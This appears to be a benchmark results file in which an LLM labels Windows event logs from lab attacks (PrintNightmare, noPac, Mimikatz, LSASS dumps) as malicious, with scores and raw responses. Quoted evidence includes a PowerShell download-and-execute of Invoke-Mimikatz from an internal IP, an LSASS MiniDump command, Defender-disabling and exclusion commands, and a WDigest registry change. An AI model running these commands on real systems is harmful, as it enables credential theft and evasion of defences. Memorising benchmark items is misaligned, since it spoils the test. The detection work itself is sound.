# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,"ID4674,6416 New external device connected (PrintNightmare).csv",,,processed,YES,100.0,100.0,YES,"6416, 4688, 4674","cmd.exe, conhost.exe, spoolsv.exe, dllhost.exe","FS03$, admmig","""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",\\fs03vuln\Kiwi Legit Printer,"\REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer",0.0,10.73,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6416, 4688, 4674
- Processes: cmd.exe, conhost.exe, spoolsv.exe, dllhost.exe
- Accounts: FS03$, admmig
- Commands: ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: \\fs03vuln\Kiwi Legit Printer
- Registry: \REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer

EXPLANATION:
The installation of a new print device (""Kiwi Legit Printer"") via the spooler (Event 6416) immediately followed by spoolsv.exe spawning cmd.exe under the SYSTEM account (FS03$) is the classic signature of a PrintNightmare/spooler exploitation chain. The use of SeTakeOwnershipPrivilege on the printer connection registry key and the named ""Legit Printer"" decoy strongly indicate abuse of the print spooler for SYSTEM-level code execution rather than legitimate printer driver installation."
claude-opus-4-8,"ID47x,4661-4662,5136,4688,4697-SAM the admin (CVE-2021-42287).csv",,,processed,YES,100.0,58.3,YES,"4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688","C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe","hack1, compnay-88$, rootdc1, admmhorvath, ROOTDC1$, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan",C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | C:\Windows\TEMP\execute.bat &amp | C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp | del C:\Windows\TEMP\execute.bat,"10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a",,0.0,11.03,3.5,6.0,4.0,4,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688
- Processes: C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe
- Accounts: hack1, compnay-88$, rootdc1, admmhorvath, ROOTDC1$, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan
- Commands: C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat
- Network: 10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
This shows a domain compromise: account hack1 creates a computer account (compnay-88$) via SeMachineAccountPrivilege then renames its SamAccountName/dNSHostName to ""rootdc1"" (4741/4742/4781), a hallmark of the noPac (CVE-2021-42278/42287) attack to impersonate the domain controller and obtain Kerberos tickets (4768/4769) for the DC. Subsequently admmhorvath connects over IPC$ and creates a service ""BTOBTO"" running an obfuscated cmd.exe payload that writes output to \\127.0.0.1\C$\__output, the classic Impacket smbexec remote code execution pattern. The combination of machine-account spoofing, ticket abuse, and remote service-based command execution against the DC is clearly malicious."
claude-opus-4-8,"ID4674,5142-Mimikatz print spool privileges requested.csv",,,processed,YES,100.0,100.0,YES,"4674, 5142",C:\Windows\System32\spoolsv.exe,"admmig, FS03VULN$",,\\*\Kiwi Legit Printer,,0.0,4.48,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4674, 5142
- Processes: C:\Windows\System32\spoolsv.exe
- Accounts: admmig, FS03VULN$
- Commands: None
- Network: \\*\Kiwi Legit Printer
- Registry: None

EXPLANATION:
The ""Kiwi Legit Printer"" object name is a hallmark of the Mimikatz/PrintNightmare-style printer driver exploitation, where a fake printer is registered via the Spooler service to load a malicious driver and gain SYSTEM-level execution. The repeated SeTakeOwnershipPrivilege use against the Printer object through spoolsv.exe, paired with new printer share creation (5142) under the SYSTEM machine account, strongly indicates abuse of the Print Spooler for privilege escalation rather than legitimate printer installation."
claude-opus-4-8,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,4.80,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: None
- Registry: None

EXPLANATION:
The security log was cleared (Event 1102) by admmig immediately before an explicit-credential logon (4648) and network logon (4624) using account test10 launched from powershell.exe. This pairing of audit-log destruction followed by credential switching and reconnaissance commands (whoami) is consistent with attacker anti-forensics and lateral movement rather than routine administration."
claude-opus-4-8,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON, S-1-5-18","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,5.66,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON, S-1-5-18
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
The sequence begins with the security log being cleared (Event 1102) by user hack1, a classic anti-forensic action, immediately followed by execution of MSFRottenPotato.exe, a known privilege-escalation tool. The subsequent ANONYMOUS LOGON over NTLM V1 from 127.0.0.1 and a SYSTEM-context (S-1-5-18 / FS03VULN$) cmd.exe spawned from the RottenPotato process confirms a successful token-impersonation privilege escalation to SYSTEM. This combination of log clearing, exploit tooling, and escalation is clearly malicious."
claude-opus-4-8,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,95.0,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,6.21,5.7,6.0,4.0,4,19.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
- Accounts: admmig, hack1, FS03$
- Commands: runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: ::1
- Registry: None
- Accounts: admmig, hack1, FS03$

EXPLANATION:
The sequence begins with Event 1102 (Security log cleared by admmig), a classic anti-forensic / defense-evasion action, immediately followed by a runas execution of cmd.exe as a suspicious account ""hack1"". The newly logged-on hack1 account is granted highly sensitive privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege) via Event 4672, indicating a privilege-escalation chain. The combination of log clearing, credential-based runas to a non-standard account, and acquisition of powerful privileges in a short timeframe strongly indicates malicious activity."
claude-opus-4-8,ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,hard,C,processed,YES,100.0,90.0,YES,"800, 4104, 4103","powershell.exe, C:\TOOLS\Add-RemoteRegBackdoor.ps1",OFFSEC\hack1,"Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', Get-WMIObject -Class Win32_Service -Filter ""name='RemoteRegistry'"", $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter ""__CLASS = 'StdRegProv'""",FS03,"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account",0.0,8.84,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: powershell.exe, C:\TOOLS\Add-RemoteRegBackdoor.ps1
- Accounts: OFFSEC\hack1
- Commands: Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', Get-WMIObject -Class Win32_Service -Filter ""name='RemoteRegistry'"", $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter ""__CLASS = 'StdRegProv'""
- Network: FS03
- Registry: SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account

EXPLANATION:
The Add-RemoteRegBackdoor.ps1 script grants the 'Everyone' trustee (SID S-1-1-0) ALL_ACCESS (mask 983103) ACEs on sensitive registry keys including the winreg remote-access key, LSA secret-related keys (JD, Skew1, Data, GBG), SECURITY, and SAM, enabling remote retrieval of credential material/secrets. This deliberate weakening of ACLs on credential-bearing hives is a known persistence/credential-access backdoor technique and is not routine administrative activity. The actor OFFSEC\hack1 executed it via WMI StdRegProv against FS03, confirming malicious intent."
claude-opus-4-8,ID800-4103-4104 Defender critical features disabled (PowerShell).evtx,hard,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,"Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true, Microsoft.PowerShell.Core\Set-StrictMode -Off",,,0.0,6.09,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true, Microsoft.PowerShell.Core\Set-StrictMode -Off
- Network: None
- Registry: None

EXPLANATION:
The account OFFSEC\admmig executed a rapid sequence of Set-MpPreference commands within seconds that systematically disabled Windows Defender protections: real-time monitoring, IOAV protection, behavior monitoring, intrusion prevention, and inbound connection filtering. This is a classic defense-evasion (MITRE T1562.001 Impair Defenses) chain designed to blind antivirus before further malicious activity. The deliberate, sequential disabling of multiple security features is not consistent with routine administration and strongly indicates attacker behavior."
claude-opus-4-8,ID4688-5447-4950-Firewall disabled (command).evtx,hard,C,context_exceeded,NO,0.0,0.0,NO,,,,,,,,2.95,,,,,,,"Error: Anthropic rejected the request - Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'prompt is too long: 1250796 tokens > 1000000 maximum'}, 'request_id': 'req_011Cc5z1okUN3oudiRyYC75t'}"
claude-opus-4-8,"ID4742,4935,4662,4661,5137-DCshadow attack (GLOBAL) failed.csv",,,processed,YES,100.0,50.0,YES,"4662, 4742, 4935, 5137, 5136, 4936, 4929",,"admmig, JUMP01$",,"jump01.offsec.lan, rootdc1.offsec.lan",,0.0,8.26,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4662, 4742, 4935, 5137, 5136, 4936, 4929, 4662
- Processes: None
- Accounts: admmig, JUMP01$
- Commands: None
- Network: jump01.offsec.lan, rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The account admmig modified the servicePrincipalName attribute of the JUMP01$ computer object and the source (jump01.offsec.lan) attempted DRS replication (Event 4929, 4932-style replication events with status codes 8452/1722), which is consistent with a DCSync/DCShadow-style attack that registers a rogue DC and abuses GUID-based replication SPNs (E3514235-... DRS service class). The combination of SPN manipulation on a non-DC computer object plus replication attempts from that host to the real DC (rootdc1) is a strong indicator of a DCShadow attack rather than routine administration."
claude-opus-4-8,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,72.2,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')( $(Sv 'Ofs' '' ) +[StriNG]('...').SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')","https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/",,0.0,8.90,4.3,6.0,4.0,3,17.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')( $(Sv 'Ofs' '' ) +[StriNG]('...').SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')
- Network: https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/
- Registry: None

EXPLANATION:
This is a clear malicious attack: heavily obfuscated PowerShell launched with execution-bypass, no-profile, hidden-window flags decodes a payload that disables AMSI ([Ref].Assembly amsiInitFailed reflection), downloads Invoke-Mimikatz from a remote host, and runs credential-dumping commands (privilege::debug sekurlsa::logonpasswords) before exfiltrating results via HTTP POST. The activity was executed by OFFSEC\admmig and was flagged/blocked as malicious content by antivirus, confirming credential-theft intent."
claude-opus-4-8,ID800-4103-4104 Defender exclusion added (PowerShell).evtx,medium,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,"Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', Microsoft.PowerShell.Core\Set-StrictMode -Off",,,0.0,4.92,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', Microsoft.PowerShell.Core\Set-StrictMode -Off
- Network: None
- Registry: None

EXPLANATION:
The user OFFSEC\admmig used PowerShell to add Windows Defender exclusions for a path named ""c:\document\virus\"" and for all "".exe"" files, which disables antivirus scanning on those locations and file types. This is a classic defense evasion technique (MITRE T1562.001) used to allow malware to execute undetected, and the suspicious folder name ""virus"" combined with excluding all executables strongly indicates malicious intent rather than legitimate administration."
claude-opus-4-8,ID5145-4624-DonPAPI full extraction.csv,,,processed,YES,100.0,70.8,YES,"1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662","C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe","hack1, admmig, FS03VULN$, LOCAL SERVICE, ANONYMOUS LOGON","C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff",10.23.123.11,,0.0,13.07,4.2,6.0,4.0,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662
- Processes: C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe
- Accounts: hack1, admmig, FS03VULN$, LOCAL SERVICE, ANONYMOUS LOGON
- Commands: C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
The log opens with Event 1102 (Security log cleared) by user ""hack1"" — a classic anti-forensic action — followed by privileged NTLM logons (including an NTLM V1 ANONYMOUS LOGON) from 10.23.123.11 and admmig with SeDebug/SeImpersonate privileges. The actor remotely writes random .tmp files into ADMIN$\SYSTEM32 (PsExec/SMBexec-style service execution via svcctl/winreg), spawns cmd.exe running C:\tools\shell.cmd, and systematically harvests DPAPI master keys, Credentials, Vault, browser profiles (Firefox/Chrome), VNC ini files, RDCMan and mRemoteNG configs across every user profile. This pattern of log clearing, lateral movement via admin shares, and mass credential/secret theft is clearly malicious attacker behavior."
claude-opus-4-8,ID1-12-13-Wdigest authentication activation.evtx,easy,A,processed,YES,100.0,80.0,YES,"1, 12, 13","C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe",OFFSEC\admmig,reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1,,"HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",0.0,5.54,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 12, 13
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe
- Accounts: OFFSEC\admmig
- Commands: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
- Network: None
- Registry: HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential

EXPLANATION:
The reg.exe command sets the WDigest UseLogonCredential value to 1, which forces Windows to store plaintext credentials in memory, enabling credential theft via tools like Mimikatz. The event correlation shows the registry key creation (Event 12) and value set to DWORD 0x00000001 (Event 13) executed under a high-integrity cmd.exe session, matching ATT&CK techniques T1112 and T1003. This is a clear credential-access preparation step and is malicious."
claude-opus-4-8,ID1-LSASS dump with LSASSY (SYSMON).evtx,easy,B,processed,YES,100.0,68.9,YES,"18, 1, 7, 11, 10","C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full | Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",,,0.0,7.76,4.1,6.0,4.0,4,18.1,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 18, 1, 7, 11, 10
- Processes: C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full
- Network: None
- Registry: None

EXPLANATION:
This is a clear LSASS credential dumping attack using the comsvcs.dll MiniDump technique, spawned via WMI (wmiprvse.exe parent) and executed by powershell.exe and rundll32.exe. Event 10 confirms rundll32.exe opened lsass.exe with GrantedAccess 0x1FFFFF (full access) and a CallTrace through dbghelp.dll/comsvcs.dll, and Event 11 shows the resulting dump file C:\Windows\Temp\76nivOxA.dmp being written. The remote WMI execution chain and credential theft objective make this malicious."
claude-opus-4-8,ID10-Mimikatz LSASS process dump.evtx,easy,A,processed,YES,100.0,100.0,YES,"1, 10","C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe","OFFSEC\admmig, NT AUTHORITY\SYSTEM","mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""",,,0.0,4.88,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 10
- Processes: C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
- Commands: mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""
- Network: None
- Registry: None

EXPLANATION:
Mimikatz, a known credential-dumping tool, was executed at High integrity by OFFSEC\admmig and opened a handle to lsass.exe (GrantedAccess 0x1010) to extract credentials. It then spawned a child cmd.exe running as NT AUTHORITY\SYSTEM, indicating privilege escalation to SYSTEM. The combination of LSASS access and SYSTEM-level shell from a credential theft tool is clearly malicious."
claude-opus-4-8,ID11-LSASS credentials dump via Task Manager.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\System32\Taskmgr.exe,admmig,,,,0.0,3.38,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\System32\Taskmgr.exe
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This event shows Taskmgr.exe creating a file named ""lsass (4).DMP"" in the user's Temp directory, indicating a memory dump of the LSASS process. Dumping LSASS memory is a well-known credential theft technique used to extract password hashes and credentials. The ""(4)"" suffix suggests repeated dumping attempts, further supporting malicious credential-harvesting activity."
claude-opus-4-8,ID11-Mimikatz LSA SSP clear text password exfiltration.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\system32\lsass.exe,,,,,0.0,3.69,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\system32\lsass.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The creation of C:\Windows\System32\mimilsa.log by lsass.exe is a well-known artifact of Mimikatz's misc::memssp module, which injects a malicious SSP to capture plaintext credentials. The RuleName T1003 (OS Credential Dumping) and the mimilsa.log filename strongly indicate credential theft activity rather than legitimate system behavior."
claude-opus-4-8,ID800-4103-4104-Firewall configuration enumerated (PowerShell).evtx,hard,C,context_exceeded,NO,0.0,0.0,NO,,,,,,,,6.84,,,,,,,"Error: Anthropic rejected the request - Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'prompt is too long: 1654365 tokens > 1000000 maximum'}, 'request_id': 'req_011Cc5z6ujXMYePQDfoQqJz8'}"
